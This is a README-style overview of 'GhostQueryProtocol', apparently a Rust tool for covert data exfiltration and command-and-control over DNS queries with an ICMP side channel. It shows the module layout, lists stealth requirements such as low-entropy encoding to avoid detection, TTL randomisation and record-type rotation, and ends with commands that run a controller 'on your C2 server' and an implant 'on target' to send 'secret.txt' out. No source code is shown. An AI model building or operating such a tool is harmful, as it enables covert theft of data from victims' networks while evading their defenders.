# Project Structure

```
GhostQueryProtocol/
+-- Cargo.toml                 # Project manifest with dependencies
+-- src/
    +-- lib.rs                 # Library root
    +-- bin/
    |   +-- implant.rs         # Edge node CLI binary
    |   +-- controller.rs      # Master node CLI binary
    +-- common/
    |   +-- types.rs           # SessionId, ChunkId, Command, etc.
    |   +-- constants.rs       # Protocol constants
    |   +-- error.rs           # Error types with Result alias
    +-- encoding/
    |   +-- dictionary.rs      # Low-entropy dictionary mapping
    |   +-- base32.rs          # Base32 encoding (DNS-safe)
    |   +-- entropy.rs         # Entropy analysis and reduction
    +-- crypto/
    |   +-- cipher.rs          # AES-256-GCM encryption
    |   +-- hash.rs            # SHA-256 hashing for integrity
    |   +-- keys.rs            # Key management and derivation
    +-- session/
    |   +-- state.rs           # Session state machine (ADSM-inspired)
    |   +-- buffer.rs          # Chunk buffer with sliding window
    |   +-- manager.rs         # Multi-session management
    +-- protocol/
    |   +-- chunker.rs         # File chunking and reassembly
    |   +-- window.rs          # Sliding/rolling window controller
    |   +-- coherence.rs       # Gap detection and retransmission
    |   +-- commands.rs        # Control command encoding
    +-- transport/
    |   +-- dns/               # DNS transport layer
    |   |   +-- query.rs       # Query construction
    |   |   +-- response.rs    # Response parsing
    |   |   +-- client.rs      # DNS client
    |   |   +-- server.rs      # DNS server
    |   +-- icmp/              # ICMP side-channel
    |       +-- client.rs      # Signal sender
    |       +-- server.rs      # Signal receiver
    +-- implant/
    |   +-- client.rs          # Edge node implementation
    +-- controller/
        +-- server.rs          # Master node implementation
        +-- shadow.rs          # Shadow memory for reconstruction
```

# Implemented Requirements

## Functional Requirements:

1. Session management with sessionID and file hash
2. Chunking and encoding with low-entropy dictionary
3. Transport via DNS queries (A/AAAA/CNAME/MX/TXT rotation)
4. Acknowledgement and error handling with retransmission
5. Control signaling via DNS responses and ICMP
6. Session completion with hash verification
7. AES-256-GCM encryption before encoding
8. Shared dictionary for encoding/decoding
9. Modular API design

## Non-Functional Requirements:

1. Performance-tuned with configurable chunk/window sizes
2. Stealth features: low-entropy encoding, TTL randomization, record rotation
3. Reliability via sliding window and retransmission
4. Scalability through async event-driven architecture
5. Modular, maintainable code structure

# Build and Run

```
# Build the project
cargo build --release

# Run the controller (on your C2 server)
sudo ./target/release/gq-controller -d ghost.local -b 0.0.0.0:53 -o ./output

# Run the implant (on target)
./target/release/gq-implant -f secret.txt -d ghost.local -k <shared-key>
```
